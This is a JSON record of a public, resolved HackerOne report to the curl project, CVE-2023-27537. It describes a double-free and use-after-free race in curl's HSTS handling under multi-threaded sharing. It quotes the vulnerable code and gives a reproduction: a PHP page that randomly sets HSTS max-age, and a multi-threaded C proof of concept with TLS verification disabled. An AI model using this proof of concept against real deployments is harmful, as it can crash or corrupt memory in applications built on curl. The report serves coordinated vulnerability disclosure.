{
  "id": 1897203,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xODk3MjAz",
  "url": "https://hackerone.com/reports/1897203",
  "title": "CVE-2023-27537: HSTS double-free",
  "state": "Closed",
  "substate": "resolved",
  "severity_rating": "low",
  "readable_substate": "Resolved",
  "created_at": "2023-03-08T18:10:27.746Z",
  "submitted_at": "2023-03-08T18:10:27.876Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "kurohiro",
    "url": "/kurohiro",
    "profile_picture_urls": {
      "small": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
    },
    "is_me?": false,
    "cleared": false,
    "verified": false,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 35663,
    "url": "https://hackerone.com/curl",
    "handle": "curl",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/035/663/2faf4c279d437d64bfda6d23d62ce1833813a4d9_original.png/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/035/663/2faf4c279d437d64bfda6d23d62ce1833813a4d9_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
    },
    "permissions": [],
    "submission_state": "open",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "profile": {
      "name": "curl",
      "twitter_handle": "",
      "website": "https://curl.se",
      "about": "cURL is an Open Source project providing a library and command-line tool for doing internet transfers"
    }
  },
  "has_bounty?": false,
  "in_validation?": false,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [
    "CVE-2023-27537"
  ],
  "singular_disclosure_disabled": false,
  "disclosed_at": "2023-03-20T11:24:38.300Z",
  "bug_reporter_agreed_on_going_public_at": "2023-03-20T11:24:38.184Z",
  "team_member_agreed_on_going_public_at": "2023-03-20T07:59:41.640Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "## Summary:\nWhen processing HSTS with multi-threading, double-free or UAF may occur due to lack of exclusion control.\nHSTS entries disappear when they expire or when \"max-age=0\" is received.\nIn this case, the offending entry is removed from the internal memory list, freeing memory but not exclusivity control.\nTherefore, depending on the timing, other threads may perform the operation, resulting in double-free or UAF.\n\n`lib/hsts.c` in the function `Curl_hsts_parse` on lines 213-221\n```\n  if(!expires) {\n    /* remove the entry if present verbatim (without subdomain match) */\n    sts = Curl_hsts(h, hostname, FALSE);\n    if(sts) {\n      Curl_llist_remove(&h->list, &sts->node, NULL);\n      hsts_free(sts);\n    }\n    return CURLE_OK;\n  }\n```\n\nIf multiple threads process `hsts_free(sts);` at the same time, it becomes double-free.\nAnother problem is that UAF occurs when other threads access entries.\n\nLines 270-275 have a similar problem.\n\n## Steps To Reproduce:\n\n  1. [Prepare the following php.]\n```\n<?php\n$random = rand(0, 1);\nif($random == 0){\n        header(\"strict-transport-security: max-age=9999\");\n}else{\n        header(\"strict-transport-security: max-age=0\");\n}\n```\n  2. [Compile and run the following cpp.]\n```\n#include <stdio.h>\n#define HAVE_STRUCT_TIMESPEC // [Add] \n#include <pthread.h>\n#include <curl/curl.h>\n\n#define NUMT 100\n\nconst char* const url = \"https://test.local/poc.php\";\n\npthread_mutex_t lock[9];\n\nstatic void lock_cb(CURL* handle, curl_lock_data data,\n    curl_lock_access access, void* userptr)\n{\n    pthread_mutex_lock(&lock[data]); /* uses a global lock array */\n}\n\nstatic void unlock_cb(CURL* handle, curl_lock_data data,\n    void* userptr)\n{\n    pthread_mutex_unlock(&lock[data]); /* uses a global lock array */\n}\n\nstatic void* pull_one_url(void* shobject)\n{\n    CURL* curl;\n\n    for (int i = 0; i < 100; i++) {\n        curl = curl_easy_init();\n        curl_easy_setopt(curl, CURLOPT_URL, url);\n        curl_easy_setopt(curl, CURLOPT_HSTS, \"c:\\\\home\\\\hsts.txt\");\n        curl_easy_setopt(curl, CURLOPT_SHARE, shobject);\n        curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);\n        curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);\n        curl_easy_perform(curl); /* ignores error */\n        curl_easy_cleanup(curl);\n    }\n\n    return NULL;\n}\n\nint main(int argc, char** argv)\n{\n    pthread_t tid[NUMT] = {0};\n    int i;\n\n    for(i = 0;i<=9;i++)\n        pthread_mutex_init(&lock[i], NULL);\n    \n    /* Must initialize libcurl before any threads are started */\n    curl_global_init(CURL_GLOBAL_ALL);\n    CURLSH* shobject = curl_share_init();\n    curl_share_setopt(shobject, CURLSHOPT_SHARE, CURL_LOCK_DATA_HSTS);\n    curl_share_setopt(shobject, CURLSHOPT_LOCKFUNC, lock_cb);\n    curl_share_setopt(shobject, CURLSHOPT_UNLOCKFUNC, unlock_cb);\n    for (i = 0; i < NUMT; i++) {\n        int error = pthread_create(&tid[i],\n            NULL, /* default attributes please */\n            pull_one_url,\n            (void*)shobject);\n        if (0 != error)\n            fprintf(stderr, \"Couldn't run thread number %d, errno %d\\n\", i, error);\n        else\n            fprintf(stderr, \"Thread %d, gets %s\\n\", i, url);\n    }\n\n    /* now wait for all threads to terminate */\n    for (i = 0; i < NUMT; i++) {\n        pthread_join(tid[i], NULL);\n        fprintf(stderr, \"Thread %d terminated\\n\", i);\n    }\n    curl_share_cleanup(shobject);\n    curl_global_cleanup();\n    return 0;\n}\n\n```\nThe source was referred to under docs/examples.\n\nSupplement.\nURL is https://test.local/poc.php.\nphp that randomly memorizes and deletes HSTS entries.\nIt's hard to reproduce if it's random, but I've confirmed that the problem will occur.\nI attach an image of when the UAF happened(I tried in debug build).\nThe number of threads and the number of loops are increased in order to raise the possibility that the phenomenon will occur.\n{F2216003}\n\n## Impact\n\nDouble-free",
  "weakness": {
    "id": 49,
    "name": "Double Free"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [
    {
      "id": 2216003,
      "file_name": "UAF.png",
      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/imsizp0xgfqi0k5ogf1azr575wqm?response-content-disposition=attachment%3B%20filename%3D%22UAF.png%22%3B%20filename%2A%3DUTF-8%27%27UAF.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQQCLBSCW4%2F20240213%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20240213T143511Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIGOMS6KndUyfvT2I7uEKWO2OpyMoWO3KrtU6Cwvkwkz8AiBtqvCr2eNrBUtGm5ctggDHhxd4T895V4LnTvy%2Fe1y10iqyBQh3EAMaDDAxMzYxOTI3NDg0OSIMHupIQsSh6u3QakaCKo8FEangi8DP8q6QvNRth9Zat8LAk3MO5cyfN3saFzIAkHHtBYIwGsMyzlqRCHfrJwp5TOSmSTgY4SMFotd9YHtKikAT%2FFg3PTn0juRiZq1MRLzJCl9e1ltsiXNcIWy5LoOFKRyugt4L7EYfFYGnEP3JhDbLb1HMZGSFjUWDgGfiU5mTvCbjQRp5xdacTwCTp0dIwgeTVnm0%2F5atuPf53fqjIvKBmviD8DwpCe3f%2Blg6lBUKf4GBN5SIg%2FIwKUjs8QUu46Gn3%2Fn2v9ZJVOFoNTozMIOyADbAgOYhoxDxka%2ByoZrYw%2B5O%2FDEVLQ07ZzwNkEna3hMu99uHJUMa7zBHWW9CRxPujTnee8zTXX0vcYuIjZC8Zv0TDDiVmRB%2FvhyPq3A31ooLPXxnYtFTbRIN5cTQM6Dje0pTjIAfsQ0L%2BqizGxkhkti7x1jYsQOKwa1H7DVweXueDL%2FqQpQWJZ5bY%2Boa49ndm0QDgMVpI%2FFl9JVyCFS%2BK4ekj2t9zmFlEhcGaThxQD0R3r80UFWZAAGYWrtfGsGK1xSzUCTzAuF9oPCJG%2B1fpdc8LLKFYYFGzWJvnO7D061Ph%2FifRBQrCa95HlxAPzFa%2B4wLa2mqzbIS2bMx8veVcmaxLoy4bBFVEzLIrXO7oiyRD8FWRPncPQhUoxcqKvfL9rhBNTWwU1bE97ToD9Z6rqd6jMCEuJ7cb%2BTsL14FhS%2FCWYuY4iT0Xo9uawwlA7NqC1S4wCwOJv0QoCgZYoVqoTNkqEyHBVKi5IyOWg59IFRD0iBipXVEQZ1zq%2Fzm3rxd%2FRwAj7MhumS9qJZbj4PLQOxE719tg0UlDCNACZz8IUui5zZz5%2BQFqDCvv%2B%2B74%2BHPNwHq5CUht8ylj1UeqTDL762uBjqyAWt6XWCoHESlfIpPghHCyEYGnW%2FZAnGfl1E2FbZWY72YD7b05jDBLhw81h37eOa0dp96Ri4Fe6sK8XwprMy6ipl%2FaG2GMe%2BXNdFW3axZCWvDRKrUeK2my6Ik%2BRILZhb8Vb8YeAqyNT8tNYuy4RTuRheqpe4PfZmIaKHv%2FGvzGqlLpRqnJnTVWNJDlQOamlRu6iHtu0%2BdOkS%2F5fjpyD2aRw1cPC7GSNUmW%2BBCDgH%2FG7ZFoHk%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=0337201ee439d6d8b61d0b6a0f03bad19bd084099b95711f5107aa9eca069635",
      "file_size": 172456,
      "type": "image/png",
      "moderated": null
    }
  ],
  "allow_singular_disclosure_at": "2023-04-19T07:59:41.721Z",
  "allow_singular_disclosure_after": -25943730.13685525,
  "singular_disclosure_allowed": true,
  "vote_count": 13,
  "voters": [
    "pentestor",
    "sambamsam",
    "zy9ard3",
    "yassinek3ch",
    "shubham_srt",
    "k_rohith",
    "shivammusic",
    "anubis2000",
    "abdulhafiz",
    "neimsaci",
    "and 3 more..."
  ],
  "severity": {
    "rating": "low",
    "author_type": "Team"
  },
  "structured_scope": {
    "databaseId": 18844,
    "asset_type": "SOURCE_CODE",
    "asset_identifier": "https://github.com/curl/curl",
    "max_severity": "critical"
  },
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
